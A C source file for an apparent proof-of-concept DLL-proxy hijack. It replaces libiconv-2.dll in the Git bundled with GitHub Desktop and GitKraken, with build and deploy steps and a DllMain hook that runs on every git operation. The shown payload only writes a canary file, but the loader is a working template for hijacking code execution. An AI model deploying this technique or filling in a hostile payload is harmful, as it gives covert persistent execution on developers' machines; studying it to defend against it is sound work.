// Lacuna — libiconv-2.dll proxy for bundled Git distributions
//
// Applications that bundle Git (GitHub Desktop, GitKraken) include a
// MinGW-based git distribution with libiconv-2.dll. This DLL loads on
// every git operation — including automatic background fetches.
//
// Only 10 exports to forward.
//
// Tested against:
//   GitHub Desktop: %LOCALAPPDATA%\GitHubDesktop\app-*\resources\app\git\mingw64\bin\
//   GitKraken:      %LOCALAPPDATA%\gitkraken\app-*\resources\app.asar.unpacked\git\mingw64\bin\
//
// Build:
//   x86_64-w64-mingw32-gcc -shared -o libiconv-2.dll libiconv_proxy.c libiconv_proxy.def
//
// Deploy:
//   1. Navigate to the mingw64\bin\ directory inside the app
//   2. Rename: libiconv-2.dll -> libiconv-2_orig.dll
//   3. Place compiled proxy as: libiconv-2.dll
//   4. Wait for any git operation (or trigger: git --version)

#include <windows.h>

void Payload(void) {
    char canaryPath[MAX_PATH];
    char evidence[512];
    char exePath[MAX_PATH] = {0};

    GetModuleFileNameA(NULL, exePath, sizeof(exePath));
    GetTempPathA(sizeof(canaryPath), canaryPath);
    lstrcatA(canaryPath, "lacuna_canary.txt");

    SYSTEMTIME st;
    GetLocalTime(&st);
    int len = wsprintfA(evidence,
        "=== LACUNA PROOF-OF-LOAD ===\r\n"
        "Timestamp: %04d-%02d-%02d %02d:%02d:%02d\r\n"
        "Process: %s\r\n"
        "PID: %lu\r\n"
        "DLL: libiconv-2.dll (proxy)\r\n"
        "Trigger: git operation\r\n"
        "=== END PROOF ===\r\n",
        st.wYear, st.wMonth, st.wDay,
        st.wHour, st.wMinute, st.wSecond,
        exePath, GetCurrentProcessId());

    HANDLE hFile = CreateFileA(canaryPath,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, evidence, len, &written, NULL);
        CloseHandle(hFile);
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        Payload();
    }
    return TRUE;
}
